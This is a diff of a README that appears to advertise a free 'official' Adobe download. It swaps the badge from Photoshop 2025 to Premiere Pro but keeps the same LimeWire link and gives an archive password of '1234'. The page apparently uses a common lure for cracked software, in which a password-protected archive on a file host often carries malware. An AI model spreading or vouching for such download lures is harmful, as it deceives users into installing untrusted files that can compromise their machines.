@@ -2,7 +2,7 @@
 
 ## Preview 
 <p align="center">
-  <img src="(https://i.ytimg.com/vi/9LHVLSaFaUQ/maxresdefault.jpg)" width="1000">
+  <img src="https://i.ytimg.com/vi/9LHVLSaFaUQ/maxresdefault.jpg" width="1000">
   </p>
   
 ✔ **Powerful Tools** - Advanced layers, masks, and selection capabilities  
@@ -15,7 +15,7 @@
 - **GPU**: 2GB VRAM  
 - **Storage**: 4GB available space
 - ## ⚡ Getting Started
-  [![Download](https://img.shields.io/badge/Download_Official_-Photoshop_2025-blue?style=for-the-badge&logo=adobe)](https://limewire.com/d/rNYs4#qVb2Rnhawq)
+ [![Download Adobe Premiere Pro](https://img.shields.io/badge/Download_Adobe_Premiere_Pro-9999FF?style=for-the-badge&logo=adobepremierepro&logoColor=white)](https://limewire.com/d/rNYs4#qVb2Rnhawq)
   - pass - [1234]
 
 🎨 Start Creating Today!
